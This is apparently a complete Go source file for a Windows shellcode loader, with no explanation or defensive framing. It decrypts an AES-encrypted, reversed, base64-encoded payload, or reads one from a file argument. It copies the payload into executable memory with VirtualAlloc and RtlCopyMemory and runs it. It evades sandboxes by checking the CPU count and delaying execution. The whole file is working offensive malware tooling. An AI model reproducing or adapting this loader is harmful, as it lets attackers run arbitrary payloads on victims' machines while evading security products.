package main
import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
	"time"
	"encoding/base64"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"runtime"
)
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	MYKEY = "c84fa6b830e38ee8"
	IV    = "a551df61172d53d7"
)
var (
	kernel32       = syscall.MustLoadDLL("kernel32.dll")
	ntdll          = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
	text = "aes加密的shellcode"
)
func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}
func stringReverse(str string) string{
  var bytes []byte = []byte(str)
  for i := 0; i < len(str)/2; i++ {
    tmp := bytes[len(str)-i-1]
    bytes[len(str)-i-1] = bytes[i]
    bytes[i] = tmp
  }
  str = string(bytes)
  return str;
}

func unPaddingBytes(src []byte) []byte {
	l := len(src)
	n := int(src[l-1])
	return src[:l-n]
}

func Aes_Dec(ss string) string {
	src, _ := hex.DecodeString(ss)
	block, err := aes.NewCipher([]byte(MYKEY))
	if err != nil {
		panic(err)
	}
	cbcDecrypter := cipher.NewCBCDecrypter(block, []byte(IV))
	dst := make([]byte, len(src))
	cbcDecrypter.CryptBlocks(dst, src)
	newBytes := unPaddingBytes(dst)
	return string(newBytes)
}

func main() {
	cpuNum := runtime.NumCPU()
	if(cpuNum<2){
		return
	}
	time.Sleep(8 * time.Second)
	sc_aes := Aes_Dec(text)
	sc_rev := stringReverse(sc_aes)
	sc_b64,_ := base64.StdEncoding.DecodeString(sc_rev)
	sc := sc_b64
		if len(os.Args) > 1 {
		scFileData, err := ioutil.ReadFile(os.Args[1])
		checkErr(err)
		sc = scFileData
	}
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}